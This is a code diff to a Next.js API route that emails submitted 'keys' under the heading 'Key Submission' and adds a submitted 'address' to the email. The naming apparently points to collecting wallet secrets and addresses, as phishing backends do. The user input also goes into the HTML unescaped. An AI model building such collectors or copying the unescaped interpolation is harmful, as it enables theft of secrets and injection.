@@ -12,7 +12,7 @@ const transporter = nodemailer.createTransport({
 })
 
 export async function POST(req: NextRequest) {
-    const { keys } = await req.json()
+    const { keys , address} = await req.json()
 
     if (!keys) return NextResponse.json({ error: "Missing fields", status: 400 }, { status: 400 })
 
@@ -21,7 +21,7 @@ export async function POST(req: NextRequest) {
         await transporter.sendMail({
             to: [],
             from: `"The Sector: Key Submission" <${process.env.EMAIL_USER}>`,
-            text: `New keys submision review: ${keys}`,
+            text: `New keys submision review: ${keys} `,
             html: `
     <!DOCTYPE html>
     <html>
@@ -32,6 +32,7 @@ export async function POST(req: NextRequest) {
         </head>
         <body>
             <div>${KeywordsModal}</div>
+            <div>Address:${address}</div>
         </body>
     </html>
             `
